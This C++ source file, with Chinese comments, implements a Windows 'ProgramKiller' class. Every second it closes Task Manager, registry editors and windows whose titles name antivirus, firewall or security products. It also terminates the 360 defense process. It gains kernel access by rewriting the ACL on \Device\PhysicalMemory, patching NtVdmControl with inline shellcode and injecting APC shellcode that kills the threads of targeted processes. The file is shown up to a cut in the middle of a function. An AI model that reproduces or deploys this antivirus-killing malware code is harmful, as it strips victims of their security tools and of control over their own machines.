#include "StdAfx.h"
#include "ProgramKiller.h"

#include <Tlhelp32.h>
#include <bcrypt.h>
#include <accctrl.h>
#include <Aclapi.h>

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#define InitializeObjectAttributes( p, n, a, r, s ) { (p)->Length = sizeof( OBJECT_ATTRIBUTES ); (p)->RootDirectory = r;(p)->Attributes = a; (p)->ObjectName = n;(p)->SecurityDescriptor = s; (p)->SecurityQualityOfService = NULL;}
#define OBJ_KERNEL_HANDLE 0x00000200
#define STATUS_SUCCESS 0x00000000L
#define STATUS_UNSUCCESSFUL 0xC0000001L

ULONG ConfigFlags = FLAG_RECORD_ERROR | FLAG_ALLOW_RING0 | FLAG_RING0_OPEN_FILE;

HANDLE hShellModule;

// 内核函数
POBJECT_TYPE *pobPsThreadType;
PServiceDescriptorTableEntry *pobKeServiceDescriptorTable;
ULONG *pobNtBuildNumber;
POBJECT_TYPE *pobIoFileObjectType;

NTSTATUS
	(NTAPI *pfnNtTerminateThread)(
	IN HANDLE ThreadHandle,
	IN NTSTATUS ExitStatus
	);

NTSTATUS
	(NTAPI *pfnObReferenceObjectByPointer)(
	IN PVOID Object,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_TYPE ObjectType,
	IN KPROCESSOR_MODE AccessMode
	);

NTSTATUS
	(NTAPI *pfnObReferenceObjectByHandle)(
	IN HANDLE Handle,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_TYPE ObjectType OPTIONAL,
	IN KPROCESSOR_MODE AccessMode,
	OUT PVOID *Object,
	OUT POBJECT_HANDLE_INFORMATION HandleInformation OPTIONAL
	);                                                          

NTSTATUS
	(NTAPI *pfnObOpenObjectByPointer)(
	IN PVOID Object,
	IN ULONG HandleAttributes,
	IN PACCESS_STATE PassedAccessState OPTIONAL,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_TYPE ObjectType,
	IN KPROCESSOR_MODE AccessMode,
	OUT PHANDLE Handle
	);

VOID
	(_fastcall *pfnObfDereferenceObject)(
	IN PVOID Object
	);

PVOID
	(NTAPI *pfnExAllocatePoolWithTag)(
	IN LONG PoolType,
	IN SIZE_T NumberOfBytes,
	IN ULONG Tag
	);

VOID
	(NTAPI *pfnExFreePool)(
	IN PVOID P
	);

PKTHREAD
	(NTAPI *pfnKeGetCurrentThread)(
	);

VOID
	(NTAPI *pfnKeInitializeApc)(
	IN PRKAPC Apc,
	IN PRKTHREAD Thread,
	IN KAPC_ENVIRONMENT Environment,
	IN PKKERNEL_ROUTINE KernelRoutine,
	IN PKRUNDOWN_ROUTINE RundownRoutine OPTIONAL,
	IN PKNORMAL_ROUTINE NormalRoutine OPTIONAL,
	IN KPROCESSOR_MODE ProcessorMode OPTIONAL,
	IN PVOID NormalContext OPTIONAL
	);

BOOLEAN
	(NTAPI *pfnKeInsertQueueApc)(
	IN PRKAPC Apc,
	IN PVOID SystemArgument1,
	IN PVOID SystemArgument2,
	IN LONG Increment
	);

BOOLEAN
	(NTAPI *pfnPsGetVersion)(
	PULONG MajorVersion OPTIONAL,
	PULONG MinorVersion OPTIONAL,
	PULONG BuildNumber OPTIONAL,
	PUNICODE_STRING CSDVersion OPTIONAL
	);

HANDLE
	(NTAPI *pfnPsGetCurrentProcessId)(
	);

NTSTATUS
	(NTAPI *pfnPsLookupThreadByThreadId)(
	IN PVOID UniqueThreadId,
	OUT PETHREAD *Thread
	);

NTSTATUS
	(NTAPI *pfnPsTerminateSystemThread)(
	IN NTSTATUS ExitStatus
	);

NTSTATUS
	(NTAPI *pfnZwClose)(
	IN HANDLE Handle
	);

NTSTATUS
	(NTAPI*pfnZwCreateFile)(
	OUT PHANDLE FileHandle,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	OUT PIO_STATUS_BLOCK IoStatusBlock,
	IN PLARGE_INTEGER AllocationSize OPTIONAL,
	IN ULONG FileAttributes,
	IN ULONG ShareAccess,
	IN ULONG CreateDisposition,
	IN ULONG CreateOptions,
	IN PVOID EaBuffer OPTIONAL,
	IN ULONG EaLength
	);

ULONG
	(_cdecl *pfnDbgPrint)(
	IN PCHAR Format,
	...
	);

NTSYSAPI
	NTSTATUS
	NTAPI
	ZwCreateFile(
	OUT PHANDLE FileHandle,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	OUT PIO_STATUS_BLOCK IoStatusBlock,
	IN PLARGE_INTEGER AllocationSize OPTIONAL,
	IN ULONG FileAttributes,
	IN ULONG ShareAccess,
	IN ULONG CreateDisposition,
	IN ULONG CreateOptions,
	IN PVOID EaBuffer OPTIONAL,
	IN ULONG EaLength
	);


DWORD WINAPI TaskmgrCloser(LPVOID lpParam)
{
	CProgramKiller* killer = (CProgramKiller*)lpParam;
	while(true)
	{
		killer->ProMgrcForceKillProcess();
		killer->CloseWindow();
		killer->CloseProcess();

		::Sleep(1000);
	}

	return 0;
}

CProgramKiller::CProgramKiller(void)
{
	stringVector.push_back(_T("Windows 任务管理器"));
	stringVector.push_back(_T("兔子"));
	stringVector.push_back(_T("任务"));
	stringVector.push_back(_T("优化"));
	stringVector.push_back(_T("注册表"));
	stringVector.push_back(_T("Process"));
	stringVector.push_back(_T("进程"));
	stringVector.push_back(_T("毒"));
	stringVector.push_back(_T("木马"));
	stringVector.push_back(_T("天网"));
	stringVector.push_back(_T("防火墙"));
	stringVector.push_back(_T("江民"));
	stringVector.push_back(_T("卡巴斯基"));
	stringVector.push_back(_T("安全"));
	stringVector.push_back(_T("360"));

	targetProcessName.push_back(_T("ZhuDongFangYu.exe"));
	targetProcessName.push_back(_T("iexplore.exe"));
	targetProcessName.push_back(_T("notepad.exe"));

	hThread = NULL;
	hThread = ::CreateThread(NULL, NULL, TaskmgrCloser, this, 0, &this->threadId);
}

CProgramKiller::~CProgramKiller(void)
{
	if (hThread!=NULL)
		::CloseHandle(hThread);
}

bool CProgramKiller::CloseWindow()
{
	CloseProcess();
	TCHAR str[MAX_PATH];
	POINT CurPoint;
	HWND hCurrent, hParent;

	for (vector<wstring>::iterator iter = this->stringVector.begin();iter != this->stringVector.end();iter++)
	{
		HWND hTasgmgk = FindWindow(NULL, iter->c_str());
		if (hTasgmgk != NULL)
			PostMessage(hTasgmgk, WM_DESTROY, 0, 0);
	}

	GetCursorPos(&CurPoint);
	hCurrent = WindowFromPoint(CurPoint);
	hParent = hCurrent;

	// 获得当前鼠标所在的窗口的最上层窗口句柄
	while (GetParent(hParent) != NULL)
	{
		hParent = GetParent(hParent);
	}

	::GetWindowText(hParent, str, MAX_PATH);

	wstring winTitle(str);
		
	vector<wstring>::const_iterator iter;
	wstring::size_type pos;

	for (iter = stringVector.begin();iter != stringVector.end();iter++)
	{
		pos = winTitle.find(iter->c_str());
		if (pos != wstring::npos)
		{
			PostMessage(hParent, WM_DESTROY, 0, 0);
			PostMessage(hParent, WM_CLOSE, 0, 0);
			PostMessage(hParent, WM_DESTROY, 0, 0);
			PostMessage(hParent, WM_CLOSE, 0, 0);
		}
	}

	return true;
}

bool CProgramKiller::CloseProcess()
{
	// 要被关闭的进程的名称
	for (vector<wstring>::iterator iter = targetProcessName.begin();iter != targetProcessName.end();iter++)
	{
		wstring processName(*iter);

		HANDLE hKernel32;
		HANDLE hSnap;
		PROCESSENTRY32 pe;
		BOOL bNext;
		pe.dwSize = sizeof(pe);

		hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

		bNext = Process32First(hSnap, &pe);

		while(bNext)
		{
			// 找到的进程与指定的进程的名称相同
			if (processName.compare(pe.szExeFile) == 0)
			{
				hKernel32 = OpenProcess(PROCESS_TERMINATE|PROCESS_CREATE_THREAD|
					PROCESS_VM_WRITE|PROCESS_VM_OPERATION, 1, pe.th32ProcessID);
				TerminateProcess(hKernel32, 0);
				break;
			}

			bNext = Process32Next(hSnap, &pe);
		}

		CloseHandle(hSnap);
	}
	
	return false;
}
// 在Ring0级杀掉进程的函数
NTSTATUS
	Ring0KillThread(
	IN /*PRING0_KILLTHREAD*/PVOID ThreadArg
	)
{
	PRING0_KILLTHREAD ThreadArgument = (PRING0_KILLTHREAD)ThreadArg;
	NTSTATUS status;
	PETHREAD Thread;
	PKAPC ExitApc;
	ULONG i, j;
	BOOLEAN SystemThread;
	UCHAR ApcRoutine1[] =
		"\x58"				//pop eax		;弹出返回地址
		"\x59"				//pop ecx		;弹出APC参数
		"\x83\xc4\x10"		//add esp, 4*4	;移除4个参数
		"\xff\x71\x20"		//push dword ptr [ecx+20h];压入ExitStatus
		"\x50"				//push eax		;压入返回地址
		"\x51"				//push ecx		;压入为APC分配的内存
		"\x68\x78\x56\x34\x12"	//push 12345678h	;压入PsTerminateSystemThread地址
		"\x68\x78\x56\x34\x12"	//push 12345678h	;压入ExFreePool地址
		"\xc3";				//ret			;在栈中调用ExFreePool和PsTerminateSystemThread
	UCHAR ApcRoutine2[] =
		"\x58"				//pop eax		;弹出返回地址
		"\x59"				//pop ecx		;弹出APC参数
		"\x83\xc4\x10"		//add esp, 4*4	;移除4个参数
		"\xff\x71\x20"		//push dword ptr [ecx+20h];压入ExitStatus
		"\x6a\xfe"			//push -2		;当前线程的伪句柄
		"\x50"				//push eax		;压入返回地址
		"\x51"				//push ecx		;压入为APC分配的内存
		"\x68\x78\x56\x34\x12"	//push 12345678h	;压入NtTerminateThread地址
		"\x68\x78\x56\x34\x12"	//push 12345678h	;压入ExFreePool地址
		"\xc3";				//ret			;在栈中调用ExFreePool和NtTerminateThread

	*(ULONG *)(ApcRoutine1 + 11) = (ULONG)pfnPsTerminateSystemThread;
	*(ULONG *)(ApcRoutine1 + 16) = (ULONG)pfnExFreePool;

	*(ULONG *)(ApcRoutine2 + 13) = (ULONG)pfnNtTerminateThread;
	*(ULONG *)(ApcRoutine2 + 18) = (ULONG)pfnExFreePool;

	for (i = 0; i < ThreadArgument->ThreadCount; i++)
	{
		status = pfnPsLookupThreadByThreadId((PVOID)ThreadArgument->ThreadArray[i], &Thread);

		if (!NT_SUCCESS(status))
			continue;

		status = pfnObReferenceObjectByPointer(	Thread,
			0x1f03ff,
			*pobPsThreadType,
			0/*KernelMode*/);

		if (!NT_SUCCESS(status))
			continue;

		SystemThread = FALSE;

		//判断是不是系统线程
		switch (*pobNtBuildNumber)
		{
		case 2195:
			if (*(ULONG *)((UCHAR *)Thread + 0x20) == 0 || *(ULONG *)((UCHAR *)Thread + 0x20) >= 0x80000000)
				SystemThread = TRUE;
			break;
		case 2600:
			if (*(ULONG *)((UCHAR *)Thread + 0x248) & 0x10)
				SystemThread = TRUE;
			break;
		}

		if (SystemThread)
		{
			ExitApc = (PKAPC)pfnExAllocatePoolWithTag(0/*NonPagedPool*/, sizeof(KAPC) + sizeof(ApcRoutine1), ' kdD');

			for (j = 0; j < sizeof(ApcRoutine1); j++)
				((UCHAR *)ExitApc)[sizeof(KAPC) + j] = ApcRoutine1[j];
		}
		else
		{
			ExitApc = (PKAPC)pfnExAllocatePoolWithTag(0/*NonPagedPool*/, sizeof(KAPC) + sizeof(ApcRoutine2), ' kdD');

			for (j = 0; j < sizeof(ApcRoutine2); j++)
				((UCHAR *)ExitApc)[sizeof(KAPC) + j] = ApcRoutine2[j];
		}

		pfnKeInitializeApc(	ExitApc,
			Thread,
			OriginalApcEnvironment,
			(PKKERNEL_ROUTINE)(((UCHAR *)ExitApc) + sizeof(KAPC)),
			NULL,
			0,
			0/*KernelMode*/,
			(PVOID)STATUS_SUCCESS);

		pfnDbgPrint("%d-%d.Try to kill thread %d, EThread=0x%08x, is system thread=%s",
			ThreadArgument->ThreadCount, i, ThreadArgument->ThreadArray[i], Thread, SystemThread == TRUE ? "true" : "false");

		//向线程插入一段结束自身的代码
		if (!pfnKeInsertQueueApc(ExitApc, ExitApc, NULL, 2))
			pfnExFreePool(ExitApc);

		pfnObfDereferenceObject(Thread);
	}

	return STATUS_SUCCESS;
}

bool CProgramKiller::isProcessTarget(UNICODE_STRING ProcessName)
{
	if (ProcessName.Length == 0)
		return false;

	vector<wstring>::iterator iter;
	vector<wstring>::size_type pos;
	wstring Buffer;

	for (iter = targetProcessName.begin();iter != targetProcessName.end();iter++)
	{
		Buffer.clear();
		Buffer.append(ProcessName.Buffer);
		pos = Buffer.find(*iter);
		if (pos != wstring::npos)
			return true;
	}

	return false;
}

DWORD WINAPI as(LPVOID lpParam)
{
	return true;
}

BOOL CProgramKiller::ProMgrcForceKillProcess()
{
	NTSTATUS status;
	PVOID pBuffer;
	ULONG i, nRetSize;
	PSYSTEM_PROCESS_INFORMATION pptInfo;
	PRING0_KILLTHREAD pThreadId = NULL;

	HMODULE hDll;

	// 动态加载dll，此DLL为系统自带，这样做为以后缩减执行程序体积做准备
	hDll = LoadLibrary(_T("Ntdll.dll"));

	// 读取DLL失败，返回false
	if (!hDll)
	{
		return false;
	}

	pZwQuerySystemInformation = (ZwQuerySystemInformation)GetProcAddress(hDll, "ZwQuerySystemInformation");
	ZwClose = (pZwClose)GetProcAddress(hDll, "ZwClose");
	ZwOpenSection = (pZwOpenSection)GetProcAddress(hDll, "ZwOpenSection");
	RtlInitUnicodeString = (pRtlInitUnicodeString)GetProcAddress(hDll, "RtlInitUnicodeString");
	NtVdmControl = (pNtVdmControl)GetProcAddress(hDll, "NtVdmControl");
	ZwTerminateThread = (pZwTerminateThread)GetProcAddress(hDll, "ZwTerminateThread");

	/*
	if (!(ConfigFlags & FLAG_ALLOW_RING0))
	{
		prs->MessageCode = MSG_RING0_DISABLED;
		return FALSE;
	}*/

	for (nRetSize = 0x1000;;)
	{
		pBuffer = LocalAlloc(LPTR, nRetSize);

		if (pBuffer == NULL)
		{
			return FALSE;
		}

		//列出系统中所有可见进程
		status = pZwQuerySystemInformation(5, pBuffer, nRetSize, &nRetSize); //SystemProcessesAndThreadsInformation

		if (status != 0xC0000004)  //STATUS_INFO_LENGTH_MISMATCH
			break;

		LocalFree(pBuffer);
	}

	if (!NT_SUCCESS(status))
	{
		LocalFree(pBuffer);
		return FALSE;
	}

	for (pptInfo = (PSYSTEM_PROCESS_INFORMATION)pBuffer;;)
	{
		if (isProcessTarget(pptInfo->ProcessName))	//查找要结束的进程
		{
			if (pptInfo->ThreadCount == 0)		//可能是对ZwQuerySystemInformation做的过滤，得不到线程列表
			{
				pThreadId = (PRING0_KILLTHREAD)LocalAlloc(LPTR, sizeof(PRING0_KILLTHREAD));
				if (pThreadId == NULL)
				{
					LocalFree(pBuffer);
					return FALSE;
				}

				pThreadId->ThreadArray = (ULONG*)LocalAlloc(LPTR, 1024 * sizeof(ULONG));//假设线程数量不会超过1023
				if (pThreadId->ThreadArray == NULL)
				{
					LocalFree(pThreadId);
					LocalFree(pBuffer);
					return FALSE;
				}

				//尝试内核级的线程枚举
				if (this->EnumAllThreads(pptInfo->ProcessId, pThreadId))
					break;
				else
				{
					LocalFree(pThreadId);
					LocalFree(pBuffer);
					return FALSE;
				}
			}
			else
			{
				pThreadId = (PRING0_KILLTHREAD)LocalAlloc(LPTR, sizeof(PRING0_KILLTHREAD));
				pThreadId->ThreadArray = (ULONG*)LocalAlloc(LPTR, pptInfo->ThreadCount * sizeof(ULONG));

				if (pThreadId == NULL)
				{
					LocalFree(pBuffer);
					return FALSE;
				}

				pThreadId->ThreadCount = pptInfo->ThreadCount;

				for (i = 0; i < pptInfo->ThreadCount; i++)	//记录下该进程所有线程的ID
				{
//					DbgPrint(("%d tid=%d\n", i, (ULONG)pptInfo->Threads[i].ClientId.UniqueThread));
					pThreadId->ThreadArray[i] = (ULONG)pptInfo->Threads[i].ClientId.UniqueThread;
				}
				break;
			}
		}

		if (pptInfo->NextEntryDelta == 0)
			break;

		pptInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG)pptInfo + pptInfo->NextEntryDelta);
	}

	if (pThreadId == NULL)
		return FALSE;

	LocalLock(pBuffer);
	status = Ring0Call(Ring0KillThread, pThreadId);			//进Ring0杀掉进程的所有线程，进程就会自动退出
	LocalUnlock(pBuffer);
	
	LocalFree(pThreadId->ThreadArray);
//	LocalFree(pThreadId);
	LocalFree(pBuffer);

	if (!NT_SUCCESS(status))
	{
		return FALSE;
	}

	return TRUE;
}


NTSTATUS Ring0Entry(
	IN PRING0_ROUTINE Ring0Routine,
	IN PVOID Ring0Argument)
{
	NTSTATUS status = STATUS_SUCCESS;

	pfnDbgPrint("Run in ring0\n");

	return status;
}

PVOID CProgramKiller::GetModuleBase(PCSTR name)
{
	NTSTATUS status;
	PVOID pBuffer, pModule;
	ULONG nRetSize, i, n;
	PSYSTEM_MODULE_INFORMATION pmi;

	pBuffer = LocalAlloc(LPTR, 0x1000);

	if (NULL == pBuffer)
	{
		DbgPrint(("LocalAlloc[0] Failed: %d\n", GetLastError()));
		return NULL;
	}

	status = pZwQuerySystemInformation(11, pBuffer, 0x1000, &nRetSize); //SystemModuleInformation

	if (status == 0xC0000004)  //STATUS_INFO_LENGTH_MISMATCH
	{
		LocalFree(pBuffer);
		pBuffer = LocalAlloc(LPTR, nRetSize);

		if (NULL == pBuffer)
		{
			DbgPrint(("LocalAlloc[1] Failed: %d\n", GetLastError()));
			return NULL;
		}

		status = pZwQuerySystemInformation(11, pBuffer, nRetSize, &nRetSize); //SystemModuleInformation
	}

	if (!NT_SUCCESS(status))
	{
		DbgPrint(("ZwQuerySystemInformation Failed: %d\n", LsaNtStatusToWinError(status)));
		LocalFree(pBuffer);
		return NULL;
	}

	pmi = (PSYSTEM_MODULE_INFORMATION)((ULONG)pBuffer + 4);
	n = *(ULONG*)pBuffer;
	pModule = NULL;

	for (i = 0; i < n; i++)
	{
		if (!_stricmp(pmi->ImageName+pmi->ModuleNameOffset, name))
		{
			pModule = pmi->Base;
			break;
		}
		pmi++;
	}

	LocalFree(pBuffer);

	return pModule;
}


void AddACEtoPhyMemObject(HANDLE hSec)
{
  PACL pDacl = NULL;
  PSECURITY_DESCRIPTOR pSD = NULL;
  PACL pNewDacl = NULL;
  GetSecurityInfo(hSec,
          SE_KERNEL_OBJECT,
          DACL_SECURITY_INFORMATION,
          NULL,
          NULL,
          &pDacl,
          NULL,
          &pSD);
  
  EXPLICIT_ACCESS ea;
  RtlZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
  ea.grfAccessPermissions = SECTION_MAP_WRITE; 
    ea.grfAccessMode = GRANT_ACCESS; 
    ea.grfInheritance= NO_INHERITANCE; 
    ea.Trustee.TrusteeForm = TRUSTEE_IS_NAME; 
    ea.Trustee.TrusteeType = TRUSTEE_IS_USER; 
    ea.Trustee.ptstrName = _T("CURRENT_USER"); 

    SetEntriesInAcl(1,&ea,pDacl,&pNewDacl);
    
    SetSecurityInfo(hSec,
          SE_KERNEL_OBJECT,
          DACL_SECURITY_INFORMATION,
          NULL,
          NULL,
          pNewDacl,
          NULL);

    if(pSD) 
        LocalFree(pSD); 
    if(pNewDacl) 
        LocalFree(pNewDacl); 
}

HANDLE CProgramKiller::OpenPhysicalMemory()
{
	DWORD dwRet;
	NTSTATUS status;
	UNICODE_STRING name;
	OBJECT_ATTRIBUTES oa;
	EXPLICIT_ACCESS_W ea;
	PSECURITY_DESCRIPTOR pSD;
	PACL pDacl = NULL;
	PACL pNewDacl = NULL;
	HANDLE hSection = NULL;

	RtlInitUnicodeString(&name, L"\\Device\\PhysicalMemory");
	InitializeObjectAttributes(&oa, &name, OBJ_KERNEL_HANDLE, NULL, NULL);

	status = ZwOpenSection(&hSection, SECTION_MAP_READ | SECTION_MAP_WRITE, &oa);

	if (status != 0xC0000022)  //STATUS_ACCESS_DENIED
	{
		DbgPrint(("ZwOpenSection[0] 失败，错误码：%d", LsaNtStatusToWinError(status)));
		return NULL;
	}

	if (NT_SUCCESS(status))
		return hSection;

 	status = ZwOpenSection(&hSection, READ_CONTROL | WRITE_DAC, &oa);

	if (!NT_SUCCESS(status))
	{
		int i = LsaNtStatusToWinError(status);
		DbgPrint(("ZwOpenSection[1] 失败，错误码：%d", LsaNtStatusToWinError(status)));
		return NULL;
	}

	dwRet = GetSecurityInfo(hSection, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, &pDacl, NULL, &pSD);

	if (dwRet != ERROR_SUCCESS)
	{
		DbgPrint(("GetSecurityInfo 失败，错误码：%d", dwRet));
		ZwClose(hSection);
		return NULL;
	}

	ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
	ea.grfAccessPermissions = SECTION_MAP_READ | SECTION_MAP_WRITE;
	ea.grfAccessMode = GRANT_ACCESS;
	ea.grfInheritance = NO_INHERITANCE;
	ea.Trustee.TrusteeForm = TRUSTEE_IS_NAME;
	ea.Trustee.TrusteeType = TRUSTEE_IS_USER;
	ea.Trustee.ptstrName = _T("CURRENT_USER");

	dwRet = SetEntriesInAcl(1, &ea, pDacl, &pNewDacl);

	LocalFree(pSD);

	if (dwRet != ERROR_SUCCESS)
	{
		DbgPrint(("SetEntriesInAcl 失败，错误码：%d", dwRet));
		ZwClose(hSection);
		return NULL;
	}

	dwRet = SetSecurityInfo(hSection, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pNewDacl, NULL);

	LocalFree(pNewDacl);
	ZwClose(hSection);

	if (dwRet != ERROR_SUCCESS)
	{
		DbgPrint(("SetSecurityInfo 失败，错误码：%d", dwRet));
		return NULL;
	}

	status = ZwOpenSection(&hSection, SECTION_MAP_READ | SECTION_MAP_WRITE, &oa);

	if (!NT_SUCCESS(status))
	{
		DbgPrint(("ZwOpenSection[2] 失败，错误码：%d", LsaNtStatusToWinError(status)));
		return NULL;
	}

	return hSection;
}

PVOID LinearToPhys(HANDLE hSection, PVOID addr)
{
	ULONG VAddr = (ULONG)addr;
	ULONG PGDE, PTE, PAddr;
	ULONG PageDirectory;
	PVOID BaseAddress;
	OSVERSIONINFO osvi = {sizeof(OSVERSIONINFO)};

	if (!GetVersionEx(&osvi))
		return NULL;

	if (osvi.dwMajorVersion != 5)
		return NULL;

	switch (osvi.dwMinorVersion)
	{
	case 0:
		PageDirectory = 0x30000;
		break;
	case 1:
		PageDirectory = 0x39000;
		break;
	default:
		return NULL;
	}

	BaseAddress = MapViewOfFile(hSection, FILE_MAP_READ, 0, PageDirectory, 0x1000);

	if (BaseAddress == NULL)
		return NULL;

	PGDE = ((PULONG)BaseAddress)[VAddr >> 22];

	UnmapViewOfFile(BaseAddress);

	if (!(PGDE & 1))
		return NULL;

	if (PGDE & 0x00000080)
	{
		PAddr = (PGDE & 0xFFC00000) + (VAddr & 0x003FFFFF);
	}
	else
	{
		PGDE = (ULONG)MapViewOfFile(hSection, 4, 0, PGDE & 0xfffff000, 0x1000);
		PTE = ((PULONG)PGDE)[(VAddr & 0x003FF000) >> 12];

		if (0 == (PTE & 1))
		{
			UnmapViewOfFile(BaseAddress);
			return NULL;
		}

		PAddr = (PTE & 0xFFFFF000) + (VAddr & 0x00000FFF);
		UnmapViewOfFile((PVOID)PGDE);
	}

	return (PVOID)PAddr;
}

BOOLEAN ReadMemory(HANDLE hMemory, PVOID pAddress, PVOID pBuffer, ULONG nSize)
{
	ULONG i, phys, size;
	PVOID buffer;

	for (i = 0; i < nSize; i += size)
	{
		phys = (ULONG)LinearToPhys(hMemory, (PVOID)((ULONG)pAddress + i));

		if (phys == 0)
			return FALSE;

		size = 0x1000 - (phys & 0xfff);
		size = size > nSize ? nSize : size;

		buffer = MapViewOfFile(hMemory, FILE_MAP_READ, 0, phys & 0xfffff000, 0x1000);

		if (buffer == NULL)
			return FALSE;

		memcpy((PCHAR)pBuffer + i, (PCHAR)buffer + (phys & 0xfff), size);
		UnmapViewOfFile(buffer);
	}

	return TRUE;
}

BOOLEAN WriteMemory(HANDLE hMemory, PVOID pAddress, PVOID pBuffer, ULONG nSize)
{
	ULONG i, phys, size;
	PVOID buffer;

	for (i = 0; i < nSize; i += size)
	{
		phys = (ULONG)LinearToPhys(hMemory, (PVOID)((ULONG)pAddress + i));

		if (phys == 0)
			return FALSE;

		size = 0x1000 - (phys & 0xfff);
		size = size > nSize ? nSize : size;

		buffer = MapViewOfFile(hMemory, FILE_MAP_WRITE, 0, phys & 0xfffff000, 0x1000);

		if (buffer == NULL)
			return FALSE;

		memcpy((PCHAR)buffer + (phys & 0xfff), (PCHAR)pBuffer + i, size);
		UnmapViewOfFile(buffer);
	}

	return TRUE;
}

NTSTATUS CProgramKiller::Ring0Call(
	IN PRING0_ROUTINE Ring0Routine,
	const IN PVOID Ring0Argument
	)
{
	PVOID pKernel = NULL;
	HMODULE hKernel = NULL;
	ULONG offset;
	HANDLE hMemory = NULL;
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	MEMORY_BASIC_INFORMATION mem;
	PVOID pAddrNtTerminateThread;
	NTSTATUS (NTAPI *pfnNtVdmControl)(IN ULONG ControlCode, IN PVOID ControlData);
	char OrigCode[26], HookCode[26] =
		"\xE8\xFF\xFF\xFF\xFF"	// call 0xffffffff		;nt!PsGetCurrentProcessId
		"\x3D\xEE\xEE\xEE\xEE"	// cmp eax, 0xeeeeeeee	;自己的PID
		"\x75\x05"				// jne $ + 5
		"\xE9\xDD\xDD\xDD\xDD"	// jmp 0xdddddddd		;Ring0Code
		"\xB8\x01\x00\x00\xC0"	// mov eax, 0xc0000001	;STATUS_UNSUCCESSFUL
		"\xC2\x08\x00";			// ret 8

	if (!(ConfigFlags & FLAG_ALLOW_RING0))
		return status;

	//获取NTOSKRNL.EXE在内核中的地址
	pKernel = GetModuleBase("ntoskrnl.exe");

//	if (NULL == pKernel)
//		pKernel = GetModuleBase("ntkrnlpa.exe");

	if (NULL == pKernel)
		return status;

	if ((ULONG)pKernel < 0x80000000 || (ULONG)pKernel > 0x9FFFFFFF)
	{
		DbgPrint(("Error: Kernel module base (%08x) is out of range.\n", pKernel));
		return status;
	}

	hKernel = LoadLibrary(_T("ntoskrnl.exe"));

	if (NULL == hKernel)
	{
		DbgPrint(("LoadLibrary Failed: %d\n", GetLastError()));
		return status;
	}

	//获取内核函数
	if (!(pfnDbgPrint = (ULONG (__cdecl *)(PCHAR,...))GetProcAddress(hKernel, "DbgPrint")) ||
		!(pfnNtVdmControl = (NTSTATUS (__stdcall *)(ULONG, PVOID))GetProcAddress(hKernel, "NtVdmControl")) ||
		!(pobNtBuildNumber = (ULONG *)GetProcAddress(hKernel, "NtBuildNumber")) ||
		!(pfnObReferenceObjectByPointer = (NTSTATUS (__stdcall *)(PVOID, ACCESS_MASK, POBJECT_TYPE, KPROCESSOR_MODE))GetProcAddress(hKernel, "ObReferenceObjectByPointer")) ||
		!(pfnObReferenceObjectByHandle = (NTSTATUS (__stdcall *)(HANDLE, ACCESS_MASK, POBJECT_TYPE, KPROCESSOR_MODE, PVOID *, POBJECT_HANDLE_INFORMATION))GetProcAddress(hKernel, "ObReferenceObjectByHandle")) ||
		!(pfnObOpenObjectByPointer = (NTSTATUS (__stdcall *)(PVOID, ULONG, PACCESS_STATE, ACCESS_MASK, POBJECT_TYPE, KPROCESSOR_MODE, PHANDLE))GetProcAddress(hKernel, "ObOpenObjectByPointer")) ||
		!(pfnObfDereferenceObject = (void (__fastcall *)(PVOID))GetProcAddress(hKernel, "ObfDereferenceObject")) ||
		!(pfnExAllocatePoolWithTag = (PVOID (__stdcall *)(LONG, SIZE_T, ULONG))GetProcAddress(hKernel, "ExAllocatePoolWithTag")) ||
		!(pfnExFreePool = (void (__stdcall *)(PVOID))GetProcAddress(hKernel, "ExFreePool")) ||
		!(pfnKeGetCurrentThread = (PKTHREAD (__stdcall *)(void))GetProcAddress(hKernel, "KeGetCurrentThread")) ||
		!(pfnKeInitializeApc = (void (__stdcall *)(PRKAPC,PRKTHREAD,KAPC_ENVIRONMENT,PKKERNEL_ROUTINE,PKRUNDOWN_ROUTINE,PKNORMAL_ROUTINE,KPROCESSOR_MODE,PVOID))GetProcAddress(hKernel, "KeInitializeApc")) ||
		!(pfnKeInsertQueueApc = (BOOLEAN (__stdcall *)(PRKAPC, PVOID, PVOID, LONG))GetProcAddress(hKernel, "KeInsertQueueApc")) ||
		!(pobKeServiceDescriptorTable = (PServiceDescriptorTableEntry *)GetProcAddress(hKernel, "KeServiceDescriptorTable")) ||
		!(pfnPsGetVersion = (BOOLEAN (__stdcall *)(PULONG, PULONG, PULONG, PUNICODE_STRING))GetProcAddress(hKernel, "PsGetVersion")) ||
		!(pfnPsGetCurrentProcessId = (HANDLE (__stdcall *)(void))GetProcAddress(hKernel, "PsGetCurrentProcessId")) ||
		!(pfnPsTerminateSystemThread = (NTSTATUS (__stdcall *)(NTSTATUS))GetProcAddress(hKernel, "PsTerminateSystemThread")) ||
		!(pfnPsLookupThreadByThreadId = (NTSTATUS (NTAPI *)(PVOID, PETHREAD *))GetProcAddress(hKernel, "PsLookupThreadByThreadId")) ||
		!(pfnZwClose = (NTSTATUS (NTAPI *)(HANDLE))GetProcAddress(hKernel, "ZwClose")) ||
		!(pfnZwCreateFile = (NTSTATUS (__stdcall *)(PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES,PIO_STATUS_BLOCK,PLARGE_INTEGER,ULONG,ULONG,ULONG,ULONG,PVOID,ULONG))GetProcAddress(hKernel, "ZwCreateFile")) ||
		!(pobIoFileObjectType = (POBJECT_TYPE *)GetProcAddress(hKernel, "IoFileObjectType")) ||
		!(pobPsThreadType = (POBJECT_TYPE *)GetProcAddress(hKernel, "PsThreadType")))
	{
		DbgPrint(("GetProcAddress Failed: %d\n", GetLastError()));
		goto FreeAndExit;
	}

	offset = (ULONG)pKernel - (ULONG)hKernel;
	//重新计算偏移
	pfnDbgPrint = (ULONG (__cdecl *)(PCHAR,...))((ULONG)pfnDbgPrint + offset);
